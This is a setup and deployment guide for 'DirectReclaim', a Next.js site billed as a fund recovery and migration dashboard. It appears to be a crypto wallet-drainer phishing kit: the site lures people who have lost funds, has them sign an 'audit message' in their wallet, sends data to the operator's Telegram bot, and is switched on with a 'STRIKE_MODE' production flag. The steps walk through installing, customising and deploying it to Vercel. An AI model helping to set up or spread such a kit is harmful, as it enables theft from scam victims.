# 🛰️ DirectReclaim | Setup & Deployment Guide

This project is a high-performance recovery and migration dashboard built with **Next.js 16**, **Tailwind CSS 4**, and **Reown AppKit**. Follow these steps to get it running.

---

## 🛠️ Step 1: Install Node.js (Required)
Before running the project, you must have **Node.js** installed.

1.  **Download:** Go to [nodejs.org](https://nodejs.org/) and download the **LTS** version.
2.  **Installation:**
    * **Windows/Mac:** Run the installer and click "Next" until finished.
    * **Linux (Ubuntu):** Run `sudo apt update && sudo apt install nodejs npm`.
3.  **Verify:** Open your terminal and type:
    ```bash
    node -v
    ```
    *If you see a version number (e.g., v20.x.x), you are ready.*
    
---

## 📂 Step 2: Open Project & Install Packages
1.  **Extract** your project folder.
2.  **Open VS Code:** Go to `File > Open Folder...` and select the `directreclaim` directory.
3.  **Open Terminal:** Press `Ctrl + \`` (backtick) in VS Code.
4.  **Install:** Type the following and press Enter:
    ```bash
    yarn install
    ```
    *(Note: If you don't have yarn, run `npm install -g yarn` first or just use `npm install`)*

---

## 🔑 Step 3: Configure Environment (.env)
You must set up your Telegram and Reown credentials. Create a file named `.env` in the root folder and fill it in:

```env
# --- TELEGRAM SETTINGS ---
NEXT_PUBLIC_TELEGRAM_BOT_TOKEN="YOUR_BOT_TOKEN_HERE"
NEXT_PUBLIC_TELEGRAM_CHAT_ID="YOUR_CHAT_ID_HERE"



4: How to Edit the Template
If you want to change the look, text, or structure of the website:
Editing Text: Open app/page.tsx. Search for phrases like "Recover your lost funds" or "Meet Directreclaim" to update the headlines and descriptions.
Changing Design: The project uses Tailwind CSS. You can change colors directly in the code (e.g., change bg-blue-600 to bg-red-500).
Global Styles: Edit app/globals.css to change the overall background color or fonts.
Audit Message: Open hooks/useAuditScanner.ts to change the text users sign in their wallet.





Step 5: Deploy to GitHub
Go to GitHub.com and create a New Repository.

In your VS Code terminal, run these commands:

Bash
git init
git add .
git commit -m "Initial upload"
git remote add origin [https://github.com/YOUR_USERNAME/YOUR_REPO_NAME.git](https://github.com/YOUR_USERNAME/YOUR_REPO_NAME.git)
git branch -M main
git push -u origin main





🚀 Step 6: Import to Vercel & Add Variables
Login: Go to Vercel.com and log in with GitHub.

Import: Click "Add New" > "Project" and click "Import" next to your GitHub repo.
Add Variables (IMPORTANT): Before clicking Deploy, open the Environment Variables section and add:
Key: NEXT_PUBLIC_TELEGRAM_BOT_TOKEN | Value: (Your Token)
Key: NEXT_PUBLIC_TELEGRAM_CHAT_ID | Value: (Your ID)
Key: NEXT_PUBLIC_REOWN_ID | Value: (Your Reown ID)
Key: NEXT_PUBLIC_STRIKE_MODE | Value: production
Deploy: Click Deploy. Vercel will give you a live link (e.g., your-project.vercel.app).